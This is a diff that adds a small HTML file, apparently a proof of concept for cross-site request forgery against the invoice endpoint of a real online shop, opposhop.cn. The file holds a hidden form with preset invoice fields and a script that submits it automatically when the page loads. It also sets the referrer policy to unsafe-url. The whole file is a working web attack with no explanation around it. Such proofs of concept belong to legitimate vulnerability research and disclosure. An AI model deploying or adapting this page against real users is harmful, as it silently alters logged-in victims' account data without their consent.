@@ -1,0 +1,22 @@
+<html>
+  <meta name="referrer" content="unsafe-url">
+  <body>
+    <form id="csrf-form" method="POST" action="https://www.opposhop.cn/cn/oapi/users/web/invoice">
+      <input type="hidden" name="id" value=""/>
+      <input type="hidden" name="type" value="1"/>
+      <input type="hidden" name="title" value="dsadsa"/>
+      <input type="hidden" name="taxNo" value=""/>
+      <input type="hidden" name="useDefault" value="1"/>
+      <input type="hidden" name="invoiceType" value="1"/>
+      <input type="hidden" name="address" value=""/>
+      <input type="hidden" name="mobile" value=""/>
+      <input type="hidden" name="bankName" value=""/>
+      <input type="hidden" name="bankAccount" value=""/>
+      <input type="submit" value="Submit">
+    </form>
+
+    <script>
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>
